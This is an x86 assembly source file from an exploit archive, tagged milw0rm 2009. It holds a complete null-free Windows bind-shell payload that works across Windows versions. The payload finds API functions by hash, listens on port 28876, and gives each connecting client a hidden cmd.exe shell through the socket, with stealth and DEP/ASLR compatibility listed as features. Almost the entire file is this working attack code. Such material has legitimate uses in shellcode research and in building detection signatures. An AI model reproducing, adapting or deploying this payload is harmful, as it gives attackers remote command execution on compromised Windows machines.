BITS 32
; Windows x86 null-free bindshell for Windows 5.0-7.0 all service packs.
; (See http://skypher.com/wiki/index.php/Hacking/Shellcode/Bind/NGS).
; Based largely on code and ideas (C) 2005 by Dafydd Stuttard, NGS Software.
; (See http://www.ngssoftware.com/papers/WritingSmallShellcode.pdf).
; Thanks to Pete Beck.
;
; Features both in this and the original code:
;  + NULL Free
;  + Windows version and service pack independant.
; Improvements of this code over the original:
;  + No assumptions are made about the values of registers.
;  + "/3GB" compatible: pointers are not assume to be smaller than 0x80000000.
;  + DEP/ASLR compatible: data is not executed, code is not modified.
;  + Windows 7 compatible: kernel32 is found based on the length of its name.
;  + Stealth: does not display a console windows on the target machine when
;    cmd.exe is executed.
;  + Allows an unlimited number of consecutive connections.
;  + Can except connections on almost any port. The range of acceptable port
;    numbers is only limited by the fact that the negative value of the port
;    number must not contain nulls.

port equ 28876                          ; The port number to bind to.

%if ((-port & 0xFF) == 0) || (-port & 0xFF00 == 0)
  %error The given port number would result in NULLs in the code :(
%endif

AF_INET                                 equ 2

; These hashes are calculated with a separate tool.
hash_xor_value                          equ 0x71
hash_start_value                        equ 0x36
hash_kernel32_CreateProcessA            equ 0xB7
hash_kernel32_LoadLibraryA              equ 0x8F
hash_ws2_32_WSAStartup                  equ 0x09
hash_ws2_32_WSASocketA                  equ 0x98
hash_ws2_32_bind                        equ 0x66
hash_ws2_32_listen                      equ 0x56
hash_ws2_32_accept                      equ 0x77
sizeof_proc_address_table               equ 7 * 4
offset_WSAStartup_in_hash_table         equ 2
offset_accept_in_hash_table             equ 6

%define B2W(b1,b2)                      (((b2) << 8) + (b1))
%define W2DW(w1,w2)                     (((w2) << 16) + (w1))
%define B2DW(b1,b2,b3,b4)               (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))

start:
    XOR     ECX, ECX                    ; ECX = 0
; Find base address of kernel32.dll. This code should work on Windows 5.0-7.0
    MOV     ESI, [FS:ECX + 0x30]        ; ESI = &(PEB) ([FS:0x30])
    MOV     ESI, [ESI + 0x0C]           ; ESI = PEB->Ldr
    MOV     ESI, [ESI + 0x1C]           ; ESI = PEB->Ldr.InInitOrder (first module)
next_module:
    MOV     EBP, [ESI + 0x08]           ; EBP = InInitOrder[X].base_address
    MOV     EDI, [ESI + 0x20]           ; EDI = InInitOrder[X].module_name (unicode string)
    MOV     ESI, [ESI]                  ; ESI = InInitOrder[X].flink (next module)
    CMP     [EDI + 12*2], CL            ; modulename[12] == 0 ? strlen("kernel32.dll") == 12
    JNE     next_module                 ; No: try next module.

; Create hash table and "ws2_32" (for LoadLibraryA) on the stack:
    PUSH    ECX                         ; Stack = 00 00 00 00
    PUSH    B2DW('2', '_', '3', '2')    ; Stack = "s2_32"
%if (hash_ws2_32_accept != 'w')
  %error The hash for ws2_32.accept is not a 'w'
%endif
    PUSH    B2DW(hash_ws2_32_bind, hash_ws2_32_listen, hash_ws2_32_accept, 's') ; hash, hash, "ws2_32"
end_of_hash_table_marker                equ 's'
    PUSH    B2DW(hash_kernel32_CreateProcessA, hash_kernel32_LoadLibraryA, hash_ws2_32_WSAStartup, hash_ws2_32_WSASocketA)
sizeof_hash_table                       equ 7
    MOV     ESI, ESP                    ; ESI -> Hash table
; Reserve space for WSADATA
    MOV     CH, 0x3                     ; ECX = 0x300
    SUB     ESP, ECX                    ; Reserve space for WSADATA
; Create a bunch of NULLs on the stack
    SUB     ESP, ECX                    ; Reserve space for NULLs
    MOV     EDI, ESP                    ; EDI = &(NULLs)
    SALC                                ; AL = 0
    REP STOSB                           ;
; Prepare arguments for various functions on the stack:
; WSASocket(__in int af=2, __in int type=1, __in int protocol=0,
;            __in LPWSAPROTOCOL_INFO lpProtocolInfo=0, __in GROUP g=0,
;            __in DWORD dwFlags=0)
                                        ; __in LPWSAPROTOCOL_INFO lpProtocolInfo=0
                                        ; __in GROUP g=0
                                        ; __in DWORD dwFlags=0
                                        ; __in int protocol=0
    INC     ECX                         ;
    PUSH    ECX                         ; __in int type = SOCK_STREAM (1)
    INC     ECX                         ;
    PUSH    ECX                         ; __in int af = AF_INET (2)
; WSAStartup(__in WORD wVersionRequested=2, __out LPWSADATA lpWSADATa=stack)
    PUSH    EDI                         ; __out LPWSADATA lpWSAData = &(WSADATA)
    PUSH    ECX                         ; __in WORD wVersionRequested = 2 (2.0)
; Set up EDI so that a proc addresses table can be created in the NULLs,
; followed by sufficient space to store a struct sockaddr_in:
    SUB     EDI, BYTE sizeof_proc_address_table + sizeof_sockaddr_in

get_proc_address_loop:
    MOVSB                               ; [EDI] = hash
    DEC     EDI                         ; Restore EDI
; Find the PE header and export and names tables of the module:
    MOV     EBX, [EBP + 0x3C]           ; EBX = &(PE header)
    MOV     EBX, [EBP + EBX + 0x78]     ; EBX = offset(export table)
    ADD     EBX, EBP                    ; EBX = &(export table)
    MOV     ECX, [EBX + 0x20]           ; ECX = offset(names table)
    ADD     ECX, EBP                    ; ECX = &(names table)
    PUSH    ESI                         ; Save ESI
; Hash each function name and check it against the requested hash:
    XOR     EDX, EDX                    ; EDX = function number (0)
next_function_loop:
; Get the next function name:
    INC     EDX                         ; Increment function number
    MOV     ESI, [ECX + EDX * 4]        ; ESI = offset(function name)
    ADD     ESI, EBP                    ; ESI = &(function name)
    MOV     AH, hash_start_value        ; Initialize the hash
hash_loop:
; Hash the function name:
    LODSB                               ; Load a character of the function name
    XOR     AL, hash_xor_value          ; Calculate a hash
    SUB     AH, AL                      ;
    CMP     AL, hash_xor_value          ; Is this the terminating 0 byte?
    JNE     hash_loop                   ; No: continue hashing
    CMP     AH, [EDI]                   ; Yes: Does the hash match ?
; Check if the hash matches and loop if not:
    JNZ     next_function_loop
    POP     ESI                         ; Restore ESI
; Find the address of the requested function:
    MOV     ECX, [EBX + 0x24]           ; ECX = offset ordinals table
    ADD     ECX, EBP                    ; ECX = &oridinals table
    MOVZX   EDX, WORD [ECX + 2 * EDX]   ; EDX = ordinal number of function
    MOV     ECX, [EBX + 0x1C]           ; ECX = offset address table
    ADD     ECX, EBP                    ; ECX = &address table
    MOV     EAX, EBP                    ; EAX = &(module)
    ADD     EAX, [ECX + 4 * EDX]        ; EAX = &(function)
; Save the address of the requested function:
    STOSD                               ; Save proc address
; When needed, call LoadLibraryA to start looking for ws2_32.dll functions:
    CMP     BYTE [ESI], hash_ws2_32_WSAStartup ; We just found LoadLibraryA
    JNE     skip_load_library           ;
    LEA     EBX, [ESI - offset_WSAStartup_in_hash_table + offset_accept_in_hash_table]
    PUSH    EBX                         ; __in LPCTSTR lpFileName = &("ws2_32")
    CALL    EAX                         ; LoadLibraryA(&"ws2_32")
    PUSH    EDI                         ; Save proc address table[WSAStartup]
    XCHG    EAX, EBP                    ; EBP = &(ws2_32.dll)
skip_load_library:
; Continue until all hashes have been found:
    CMP     BYTE [ESI], end_of_hash_table_marker
    JNE     get_proc_address_loop       ;
    POP     ESI
; Call WSAStartup (Arguments are already on the stack)
    LODSD
    CALL    EAX                         ; WSASTARTUP
; Call WSASocket (Arguments are already on the stack)
    LODSD
    CALL    EAX
    XCHG    EAX, EBP                    ; EBP = Server socket

; Create a struct sockaddr_in on the stack for use by bind()
sizeof_sockaddr_in equ 2 + 2 + 4 + 8
    SUB     DWORD [EDI], -W2DW( AF_INET, B2W(port >> 8, port & 0xFF)); sin_family = AF_INET, sin_port = (port, little endian!)
; Set up the 2nd and 3rd argument for bind:
;   bind(__in SOCKET s=(added later), __in const struct sockaddr *name, __in int namelen)
    PUSH    BYTE 0x10                   ; __in int namelen = 0x10
    PUSH    EDI                         ; __in const struct sockaddr *name = &(sockaddr_in)
; bind(), listen() and accept() all take the server socket as their first
; argument. listen() and accept() only need NULLs for the remaining arguments
; and the arguments for bind() are already on the stack. Because bind() and
; accept() return 0 and listen() returns a socket, which is not 0, a loop can be
; used to call them:
;   listen(__in SOCKET s=(added later), __in int backlog=0)
;   accept(__in SOCKET s=(added later), __in struct sockaddr *addr=0, __inout int *addrlen=0)
call_loop:
    LODSD
accept_loop:
    PUSH    EBP                         ; __in SOCKET s = Server socket descriptor
    CALL    EAX
; Check if accept() has returned a socket:
    TEST    EAX, EAX
    JZ      call_loop

; Create structures on the stack for CreateProcessA
; STARTUPINFO {
;   DWORD cb                            00-03: >= sizeof(STARTUPINFO)
;   LPTSTR lpReserved                   04-07: 0
;   LPTSTR lpDesktop                    08-0B: 0
;   LPTSTR lpTitle                      0C-0F: 0
;   DWORD dwX                           10-13: 0
;   DWORD dwY                           14-17: 0
;   DWORD dwXSize                       18-1B: 0
;   DWORD dwYSize                       1C-1F: 0
;   DWORD dwXCountChars                 20-23: 0
;   DWORD dwYCountChars                 24-27: 0
;   DWORD dwFillAttribute               28-2B: 0
;   DWORD dwFlags                       2C-2F: (STARTF_USESTD_HANDLES 0x100)
;   WORD wShowWindow                    30-31: 0
;   WORD cbReserved2                    32-33: 0
;   LPBYTE lpReserved2                  34-37: 0
;   HANDLE hStdInput                    38-3B: (Socket descriptor)
;   HANDLE hStdOutput                   3C-3F: (Socket descriptor)
;   HANDLE hStdError                    40-43: (Socket descriptor)
; }
sizeof_STARTUPINFO                      equ 0x44
offset_dwFlags_in_STARTUPINFO           equ 0x2C
offset_hStdInput_in_STARTUPINFO         equ 0x38
; Each call to accept() removes two DWORDS off the stack. These must be put back
; or ESP will run off the stack eventually:
    XOR     EDX, EDX                    ; EDX = 0
    PUSH    EDX                         ; Restore stack #1
; We'll also create a struct STARTUPINFO
    PUSH    B2DW('c', 'm', 'd', ' ')    ; Restore stack #2 and STARTUPINFO.cb = "cmd " (> 0)
    LEA     EDI, [ESP + offset_hStdInput_in_STARTUPINFO]; EDI = &(STARTUPINFO.hStdInput)
    STOSD                               ; STARTUPINFO.hStdInput = Socket descriptor
    STOSD                               ; STARTUPINFO.hStdOutput = Socket descriptor
    STOSD                               ; STARTUPINFO.hStdError = Socket descriptor
    MOV     BYTE [EDI - sizeof_STARTUPINFO + offset_dwFlags_in_STARTUPINFO + 1], 1 ; STARTUPINFO.dwFlags = STARTF_USESTDHANDLES (0x100)
; CreateProcess(...)
    PUSH    ESP                         ; __out LPPROCESS_INFORMATION lpProcessInformation == &(STARTUPINFO)
    XCHG    [ESP], EDI                  ; __out LPPROCESS_INFORMATION lpProcessInformation == &(STARTUPINFO) + sizeof(STARTUPINFO)
    PUSH    EDI                         ; __in LPSTARTUPINFO lpStartupInfo == &(STARTUPINFO)
    PUSH    EDX                         ; __in_opt LPCTSTR lpCurrentDirectory = NULL
    PUSH    EDX                         ; __in_opt LPVOID lpEnvironment = NULL
    PUSH    EDX                         ; __in DWORD dwCreationFlags = 0
    MOV     BYTE [EDI-5*4+3], 0x8       ; __in DWORD dwCreationFlags = CREATE_NO_WINDOW (0x08000000)
    PUSH    EDI                         ; __in BOOL bInheritHandles = TRUE (>0)
    PUSH    EDX                         ; __in_opt LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL
    PUSH    EDX                         ; __in_opt LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL
    PUSH    EDI                         ; __inout_opt LPTSTR lpCommandLine = &("cmd ")
    PUSH    EDX                         ; __in_opt LPCTSTR lpApplicationName = NULL
    CALL    [ESI - sizeof_proc_address_table]
; Load accept() into EAX and jump back into our code.
    MOV     EAX, [ESI - 4]
    JMP     accept_loop

; milw0rm.com [2009-07-27]